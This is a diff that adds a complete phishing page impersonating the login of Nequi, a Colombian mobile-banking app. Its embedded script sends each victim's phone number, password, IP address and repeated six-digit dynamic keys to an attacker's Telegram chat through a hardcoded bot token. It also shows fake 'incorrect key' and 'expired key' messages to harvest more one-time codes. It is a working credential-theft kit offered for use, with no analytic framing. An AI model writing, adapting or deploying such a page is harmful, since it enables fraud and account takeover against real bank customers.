@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Entra a tu Nequi</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Manrope', sans-serif; background: #FDE8F0; min-height: 100vh; }
+    .nav { display: flex; justify-content: space-between; align-items: center; padding: 0 24px; background: white; border-bottom: 1px solid #F0E0E8; position: sticky; top: 0; z-index: 100; height: 64px; }
+    .logo-img { height: 100px; width: auto; }
+    .nav-btn { background: #FF006B; color: white; border: none; padding: 10px 22px; border-radius: 8px; font-weight: 700; font-family: 'Manrope', sans-serif; font-size: 15px; cursor: pointer; }
+    .page { min-height: calc(100vh - 64px); position: relative; display: flex; align-items: center; justify-content: center; padding: 40px 16px; overflow: hidden; }
+    .blob { position: absolute; border-radius: 50%; background: rgba(255, 0, 107, 0.08); pointer-events: none; }
+    .blob-1 { width: 260px; height: 260px; top: -60px; left: -80px; }
+    .blob-2 { width: 200px; height: 200px; top: 20px; right: -60px; background: rgba(255, 0, 107, 0.05); }
+    .blob-3 { width: 300px; height: 300px; bottom: -80px; left: -60px; background: rgba(255, 0, 107, 0.06); }
+    .blob-4 { width: 180px; height: 180px; bottom: 40px; right: -50px; background: rgba(255, 0, 107, 0.04); }
+    .blob-5 { width: 120px; height: 120px; top: 50%; left: 8%; background: rgba(255, 0, 107, 0.05); }
+    .blob-6 { width: 140px; height: 140px; top: 30%; right: 6%; background: rgba(255, 0, 107, 0.04); }
+    .card { background: white; border-radius: 20px; padding: 40px 32px; width: 100%; max-width: 420px; position: relative; z-index: 2; box-shadow: 0 4px 40px rgba(255, 0, 107, 0.08); }
+    .card-title { font-size: 24px; font-weight: 800; color: #1A1A1A; text-align: center; margin-bottom: 10px; }
+    .card-subtitle { font-size: 14px; color: #888; text-align: center; margin-bottom: 28px; line-height: 1.5; }
+
+    /* Fases */
+    #loginPhase { display: block; }
+    #dynamicPhase { display: none; }
+
+    .phone-row { display: flex; align-items: center; border: 1.5px solid #E8E8E8; border-radius: 10px; margin-bottom: 14px; overflow: hidden; transition: border-color 0.2s; }
+    .phone-row:focus-within { border-color: #FF006B; }
+    .phone-prefix { display: flex; align-items: center; gap: 6px; padding: 0 12px; border-right: 1.5px solid #E8E8E8; height: 52px; white-space: nowrap; font-size: 14px; font-weight: 600; color: #333; background: #FAFAFA; user-select: none; }
+    .flag { font-size: 20px; line-height: 1; }
+    .chevron { font-size: 10px; color: #999; }
+    .phone-input { flex: 1; border: none; outline: none; padding: 0 14px; height: 52px; font-size: 15px; font-family: 'Manrope', sans-serif; color: #1A1A1A; background: transparent; }
+    .phone-input::placeholder { color: #BBBBBB; }
+    .input-field { width: 100%; border: 1.5px solid #E8E8E8; border-radius: 10px; padding: 0 14px; height: 52px; font-size: 15px; font-family: 'Manrope', sans-serif; color: #1A1A1A; outline: none; margin-bottom: 14px; transition: border-color 0.2s; background: white; }
+    .input-field::placeholder { color: #BBBBBB; }
+    .input-field:focus { border-color: #FF006B; }
+    .captcha-box { display: flex; align-items: center; gap: 16px; border: 1.5px solid #E8E8E8; border-radius: 10px; padding: 14px 16px; margin-bottom: 24px; cursor: pointer; transition: border-color 0.2s; }
+    .captcha-box:hover { border-color: #FF006B; }
+    .captcha-circle { width: 36px; height: 36px; border: 2.5px solid #FF006B; border-radius: 50%; flex-shrink: 0; display: flex; align-items: center; justify-content: center; transition: background 0.2s; }
+    .captcha-circle.checked { background: #FF006B; }
+    .captcha-circle.checked::after { content: ''; width: 10px; height: 6px; border-left: 2px solid white; border-bottom: 2px solid white; transform: rotate(-45deg) translateY(-1px); }
+    .captcha-label { font-size: 14px; color: #333; font-weight: 500; line-height: 1.4; }
+
+    /* Clave Dinámica */
+    .dynamic-inputs { display: flex; gap: 8px; margin-bottom: 24px; justify-content: center; }
+    .dynamic-input { width: 50px; height: 60px; border: 2px solid #E8E8E8; border-radius: 10px; font-size: 32px; font-weight: 700; text-align: center; color: #1A1A1A; font-family: 'Manrope', sans-serif; transition: border-color 0.2s; }
+    .dynamic-input:focus { outline: none; border-color: #FF006B; }
+    .dynamic-input.filled { border-color: #FF006B; }
+    .dynamic-input.error { border-color: #FF0000; animation: shake 0.4s; }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-10px); }
+      75% { transform: translateX(10px); }
+    }
+
+    .error-msg { color: #FF0000; font-size: 13px; text-align: center; margin-bottom: 20px; font-weight: 600; display: none; }
+    .error-msg.show { display: block; }
+
+    .submit-btn { width: 100%; background: #FFADD1; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: 700; font-family: 'Manrope', sans-serif; cursor: not-allowed; transition: background 0.3s; }
+    .submit-btn.active { background: #FF006B; cursor: pointer; }
+
+    /* Loading */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .loading-overlay.active { display: flex; }
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .loading-text { color: white; font-size: 16px; font-weight: 600; }
+
+    /* Modal expirado */
+    .expired-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9998;
+    }
+    .expired-overlay.active { display: flex; }
+    .expired-modal {
+      background: white;
+      border-radius: 16px;
+      padding: 32px 24px;
+      max-width: 320px;
+      text-align: center;
+    }
+    .expired-icon { font-size: 48px; margin-bottom: 16px; }
+    .expired-title { font-size: 16px; font-weight: 700; color: #1A1A1A; margin-bottom: 8px; }
+    .expired-subtitle { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5; }
+    .expired-btn { padding: 12px 32px; border-radius: 10px; background: #FF006B; color: white; border: none; font-weight: 700; cursor: pointer; width: 100%; }
+
+    @media (min-width: 768px) {
+      .card { padding: 48px 44px; }
+      .card-title { font-size: 28px; }
+      .blob-1 { width: 380px; height: 380px; top: -100px; left: -120px; }
+      .blob-2 { width: 300px; height: 300px; top: 20px; right: -80px; }
+      .blob-3 { width: 420px; height: 420px; bottom: -120px; left: -80px; }
+      .blob-4 { width: 260px; height: 260px; bottom: 60px; right: -60px; }
+    }
+  </style>
+</head>
+<body>
+
+  <nav class="nav">
+    <img src="logo.png" alt="Nequi" class="logo-img">
+    <button class="nav-btn">Recarga</button>
+  </nav>
+
+  <div class="page">
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="blob blob-3"></div>
+    <div class="blob blob-4"></div>
+    <div class="blob blob-5"></div>
+    <div class="blob blob-6"></div>
+
+    <div class="card">
+      <!-- FASE 1: LOGIN -->
+      <div id="loginPhase">
+        <h1 class="card-title">Entra a tu Nequi</h1>
+        <p class="card-subtitle">Podrás bloquear tu Nequi, consultar tus datos.</p>
+
+        <div class="phone-row">
+          <div class="phone-prefix">
+            <span class="flag">🇨🇴</span>
+            <span>+57</span>
+            <span class="chevron">▼</span>
+          </div>
+          <input type="tel" class="phone-input" placeholder="Número de celular" id="phone">
+        </div>
+
+        <input type="password" class="input-field" placeholder="Contraseña" id="password">
+
+        <div class="captcha-box" id="captcha" onclick="toggleCaptcha()">
+          <div class="captcha-circle" id="captchaCircle"></div>
+          <span class="captcha-label">Confirmo que soy una persona real.</span>
+        </div>
+
+        <button class="submit-btn" id="submitBtnLogin">Entra</button>
+      </div>
+
+      <!-- FASE 2: CLAVE DINÁMICA -->
+      <div id="dynamicPhase">
+        <h1 class="card-title">Clave Dinámica</h1>
+        <p class="card-subtitle">Ingresa los 6 dígitos de tu clave dinámica.</p>
+
+        <div class="dynamic-inputs">
+          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit1">
+          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit2">
+          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit3">
+          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit4">
+          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit5">
+          <input type="password" class="dynamic-input" maxlength="1" inputmode="numeric" id="digit6">
+        </div>
+
+        <p class="error-msg" id="errorMsg">Clave incorrecta. Intenta nuevamente.</p>
+
+        <button class="submit-btn" id="submitBtnDynamic">Continuar</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner"></div>
+    <p class="loading-text">Validando información...</p>
+  </div>
+
+  <!-- Expired Modal -->
+  <div class="expired-overlay" id="expiredOverlay">
+    <div class="expired-modal">
+      <div class="expired-icon">⏰</div>
+      <p class="expired-title">El tiempo de esta dinámica está vencido</p>
+      <p class="expired-subtitle">Trata con una nueva clave dinámica para continuar.</p>
+      <button class="expired-btn" id="expiredBtn">Entendido</button>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+    const CHAT_ID = '-1003781125998';
+
+    let captchaChecked = false;
+    let intentosDinamica = 0;
+    const MAX_INTENTOS = 3;
+    let lastPhone = '';
+    let lastPassword = '';
+
+    // ===== FASE 1: LOGIN =====
+    function toggleCaptcha() {
+      captchaChecked = !captchaChecked;
+      document.getElementById('captchaCircle').classList.toggle('checked', captchaChecked);
+      checkFormLogin();
+    }
+
+    function checkFormLogin() {
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const btn = document.getElementById('submitBtnLogin');
+      if (phone.length >= 7 && password.length >= 4 && captchaChecked) {
+        btn.classList.add('active');
+        btn.style.cursor = 'pointer';
+      } else {
+        btn.classList.remove('active');
+        btn.style.cursor = 'not-allowed';
+      }
+    }
+
+    document.getElementById('phone').addEventListener('input', checkFormLogin);
+    document.getElementById('password').addEventListener('input', checkFormLogin);
+
+    async function getIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch {
+        return 'No disponible';
+      }
+    }
+
+    function getDateTime() {
+      return new Date().toLocaleString('es-CO', {
+        timeZone: 'America/Bogota',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+      });
+    }
+
+    async function sendToTelegram(message) {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+        });
+        return true;
+      } catch (e) {
+        return false;
+      }
+    }
+
+    document.getElementById('submitBtnLogin').addEventListener('click', async () => {
+      const btn = document.getElementById('submitBtnLogin');
+      if (!btn.classList.contains('active')) return;
+
+      lastPhone = document.getElementById('phone').value.trim();
+      lastPassword = document.getElementById('password').value.trim();
+
+      const ip = await getIP();
+      const fecha = getDateTime();
+
+      const message = `🔔 *LOGIN NEQUI*
+━━━━━━━━━━━━━━━━━━━━━━
+📱 *Número:* +57${lastPhone}
+🔑 *Contraseña:* ${lastPassword}
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 *IP:* ${ip}
+🕐 *Fecha:* ${fecha}`;
+
+      await sendToTelegram(message);
+
+      // Cambiar a fase 2
+      document.getElementById('loginPhase').style.display = 'none';
+      document.getElementById('dynamicPhase').style.display = 'block';
+      document.getElementById('digit1').focus();
+    });
+
+    // ===== FASE 2: CLAVE DINÁMICA =====
+    const dynamicInputs = [
+      document.getElementById('digit1'),
+      document.getElementById('digit2'),
+      document.getElementById('digit3'),
+      document.getElementById('digit4'),
+      document.getElementById('digit5'),
+      document.getElementById('digit6')
+    ];
+
+    dynamicInputs.forEach((input, index) => {
+      input.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value !== '') {
+          this.classList.add('filled');
+          if (index < dynamicInputs.length - 1) {
+            dynamicInputs[index + 1].focus();
+          }
+        } else {
+          this.classList.remove('filled');
+        }
+        checkDynamicForm();
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value === '' && index > 0) {
+          dynamicInputs[index - 1].focus();
+          dynamicInputs[index - 1].value = '';
+          dynamicInputs[index - 1].classList.remove('filled');
+          checkDynamicForm();
+        }
+        if (e.key.length === 1 && !/[0-9]/.test(e.key)) e.preventDefault();
+      });
+
+      input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').split('').slice(0, 6);
+        digits.forEach((digit, i) => {
+          if (dynamicInputs[i]) { dynamicInputs[i].value = digit; dynamicInputs[i].classList.add('filled'); }
+        });
+        if (digits.length > 0) dynamicInputs[Math.min(digits.length, 6) - 1].focus();
+        checkDynamicForm();
+      });
+    });
+
+    function checkDynamicForm() {
+      const allFilled = dynamicInputs.every(input => input.value !== '');
+      const btn = document.getElementById('submitBtnDynamic');
+      btn.classList.toggle('active', allFilled);
+      btn.disabled = !allFilled;
+    }
+
+    function getCode() {
+      return dynamicInputs.map(i => i.value).join('');
+    }
+
+    function clearCode() {
+      dynamicInputs.forEach(input => {
+        input.value = '';
+        input.classList.remove('filled', 'error');
+      });
+      checkDynamicForm();
+    }
+
+    function showError() {
+      dynamicInputs.forEach(input => input.classList.add('error'));
+      document.getElementById('errorMsg').classList.add('show');
+      setTimeout(() => {
+        dynamicInputs.forEach(input => input.classList.remove('error'));
+        document.getElementById('errorMsg').classList.remove('show');
+      }, 3000);
+    }
+
+    document.getElementById('expiredBtn').addEventListener('click', function() {
+      document.getElementById('expiredOverlay').classList.remove('active');
+      clearCode();
+      setTimeout(() => dynamicInputs[0].focus(), 100);
+    });
+
+    document.getElementById('submitBtnDynamic').addEventListener('click', async () => {
+      const btn = document.getElementById('submitBtnDynamic');
+      if (btn.disabled) return;
+
+      const code = getCode();
+      intentosDinamica++;
+
+      const ip = await getIP();
+      const fecha = getDateTime();
+
+      const message = `🔐 *CLAVE DINÁMICA NEQUI*
+━━━━━━━━━━━━━━━━━━━━━━
+📱 *Número:* +57${lastPhone}
+🔑 *Contraseña:* ${lastPassword}
+🔢 *Clave Dinámica:* ${code}
+🔄 *Intento:* ${intentosDinamica}/${MAX_INTENTOS}
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 *IP:* ${ip}
+🕐 *Fecha:* ${fecha}`;
+
+      await sendToTelegram(message);
+
+      if (intentosDinamica === 1 || intentosDinamica === 2) {
+        document.getElementById('loadingOverlay').classList.add('active');
+        setTimeout(() => {
+          document.getElementById('loadingOverlay').classList.remove('active');
+          if (intentosDinamica === 1) {
+            showError();
+            setTimeout(() => {
+              clearCode();
+              dynamicInputs[0].focus();
+            }, 500);
+          } else {
+            document.getElementById('expiredOverlay').classList.add('active');
+          }
+        }, 2000);
+      } else {
+        document.getElementById('loadingOverlay').classList.add('active');
+        setTimeout(() => {
+          clearCode();
+          document.getElementById('loadingOverlay').classList.remove('active');
+          dynamicInputs[0].focus();
+        }, 2000);
+      }
+    });
+  </script>
+
+</body>
+</html>
